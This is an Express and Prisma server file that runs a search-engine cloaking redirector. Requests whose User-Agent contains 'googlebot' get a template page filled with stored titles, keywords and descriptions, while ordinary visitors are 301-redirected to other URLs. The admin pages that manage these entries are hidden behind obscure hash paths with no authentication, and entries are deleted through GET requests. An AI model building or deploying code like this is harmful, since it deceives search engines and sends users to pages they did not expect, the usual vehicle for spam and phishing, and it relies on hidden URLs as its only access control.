import express from 'express';
import { PrismaClient } from '@prisma/client';
import {z} from 'zod';
import path from 'path';
import minify from 'express-minify'
import bodyParser from 'body-parser';
const app = express();
const prisma = new PrismaClient()
app.set ( "view engine", "ejs" );
app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.get("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d", async (req, res) => {
    const data = await prisma.pageRouting.findMany({})
    return res.render(path.join(__dirname, "..", "public", "admin.ejs"), {data: data});
})

app.get('/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/2a99922bd3fcc215a7b3fcbd9667338a', (req, res) => {
    return res.render(path.join(__dirname, "..", "public", "add.ejs"), {hashId: "2a99922bd3fcc215a7b3fcbd9667338a"}); 
})

app.get('/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/2a99922bd3fcc215a7b3fcbd9667338a', (req, res) => {
    return res.render(path.join(__dirname, "..", "public", "add.ejs"), {hashId: "2a99922bd3fcc215a7b3fcbd9667338a"}); 
})

app.post('/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/2a99922bd3fcc215a7b3fcbd9667338a', async (req, res) => {
    const formSchema = z.object({
        path: z.string().min(1, "Path is required"),
        title: z.string().min(1, "Title is required"),
        redirectUrl: z.string().url("Invalid URL format"),
        keyword: z.string().min(1, "Keyword is required"),
        description: z.string().min(1, "Description is required"),
    });
    const parsedResult = formSchema.safeParse(req.body);
    if (!parsedResult.success) {
        const errors = parsedResult.error.errors.map((err) => ({
            field: err.path[0],
            message: err.message,
        }));
        return res.render(path.join(__dirname, "..", "public", "add.ejs"), {errors: errors}); 
    }
    await prisma.pageRouting.create({
        data: {
            page: parsedResult.data.path,
            title: parsedResult.data.title,
            redirect: parsedResult.data.redirectUrl,
            keyword: parsedResult.data.keyword,
            description: parsedResult.data.description,
        }
    })
    return res.redirect(301, '/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d')
})

app.get("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/:id/099af53f601532dbd31e0ea99ffdeb64", async (req, res) => {
    const item = await prisma.pageRouting.findUnique({
        where: {
            id: req.params.id,
        }
    })
    if(item){
        await prisma.pageRouting.delete({
            where: {
                id: item.id
            }
        })
    }
    const data = await prisma.pageRouting.findMany({})
    return res.render(path.join(__dirname, "..", "public", "admin.ejs"), {data: data});
})

app.get("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/:id/de95b43bceeb4b998aed4aed5cef1ae7", async (req, res) => {
    const item = await prisma.pageRouting.findUnique({
        where: {
            id: req.params.id,
        }
    })
    if(!item) return res.redirect("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d") 
    return res.render(path.join(__dirname, "..", "public", "edit.ejs"), {
        hashId: `${req.params.id}/de95b43bceeb4b998aed4aed5cef1ae7`,
        path: item.page, 
        title: item.title,
        redirectUrl: item.redirect, 
        keyword: item.keyword,
        description: item.description,
    });
})

app.post("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d/:id/de95b43bceeb4b998aed4aed5cef1ae7", async (req, res) => {
    const entrySchema = z.object({
        path: z.string().min(1, { message: "Path is required" }),
        title: z.string().min(1, { message: "Title is required" }),
        redirectUrl: z.string().url({ message: "Must be a valid URL" }),
        keyword: z.string().min(1, { message: "Keyword is required" }),
        description: z.string().min(1, { message: "Description is required" })
    });
    const item = await prisma.pageRouting.findUnique({
        where: {
            id: req.params.id,
        }
    })
    if(!item) return res.redirect("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d") 
    const validation = entrySchema.safeParse(req.body);
    if (!validation.success) {
        const errors = validation.error.errors.map(err => err.message);
        return res.status(400).render(path.join(__dirname, "..", "public", "edit.ejs"), {
            path: req.body.path,
            title: req.body.title,
            redirectUrl: req.body.redirectUrl,
            keyword: req.body.keyword,
            description: req.body.description,
            errors: errors
        });
    }
    await prisma.pageRouting.update({
        where: {
            id: item.id
        },
        data: {
            page: validation.data.path,
            title: validation.data.title,
            redirect: validation.data.redirectUrl,
            keyword: validation.data.keyword,
            description: validation.data.description,
        }
    })
    res.redirect("/pr/a2cc66b5b217d7cb70fc121cfea168ac179aa7c8/f994686e1aad5f0388d1b278fc20406d") 
})


app.use(async (req, res, next) => {
    const url = await prisma.pageRouting.findUnique({
        where: {
            page: req.url, 
        }
    })
    if(req.headers['user-agent'] && url && req.headers['user-agent'].toLowerCase().includes("googlebot")) {
       return res.render(path.join(__dirname, "..", "public", "template.ejs"), {
            path: url.page,
            title: url.title,
            redirectUrl: url.redirect,
            keyword: url.keyword,
            description: url.description
        });
    }
    if(url && url.redirect) {
        return res.redirect(301, url.redirect);
    }
    return next();
})
app.listen(80, () => {
    console.log('Server is running on port 80');
})